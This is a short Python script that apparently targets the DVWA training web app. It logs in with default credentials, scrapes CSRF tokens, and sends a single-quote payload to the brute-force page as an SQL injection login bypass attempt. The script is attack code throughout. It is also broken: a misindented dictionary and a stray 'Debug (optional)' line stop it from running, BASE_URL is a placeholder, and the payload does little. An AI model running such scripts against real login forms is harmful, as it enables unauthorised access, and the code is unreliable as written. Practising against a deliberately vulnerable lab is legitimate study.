import requests
import re

BASE_URL = "url"

def get_token(session, url):
    res = session.get(url)
    match = re.search(r"user_token' value='(.*?)'", res.text)
    if match:
        return match.group(1)
    else:
        print("[ERROR] CSRF token not found")
        return None


def login(session):
    login_url = BASE_URL + "/login.php"

    # Step 1: get token
    token = get_token(session, login_url)

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    }

    res = session.post(login_url, data=login_data)

    if "Login failed" in res.text:
        print("[ERROR] Login failed")
        return False

    print("[+] Logged in successfully")
    return True


def sqli_bypass(session):
    brute_url = BASE_URL + "/vulnerabilities/brute/"

    # Step 2: get token for brute page
    token = get_token(session, brute_url)

    payload = "'"

    

     data = {
     "username": payload,
         "password": "anything",
         "Login": "Login",
         "user_token": token
     }

    

    res = session.get(brute_url, params=data)

    

    if "Welcome to the password protected area" in res.text:
        print("[SUCCESS] SQL Injection login bypass worked!")
    else:
        print("[FAILED] Bypass did not work")

    Debug (optional)
    print("\n--- Response Snippet ---")
    print(res.text[:500])


def main():
    session = requests.Session()

    if login(session):
        sqli_bypass(session)


if __name__ == "__main__":
    main()
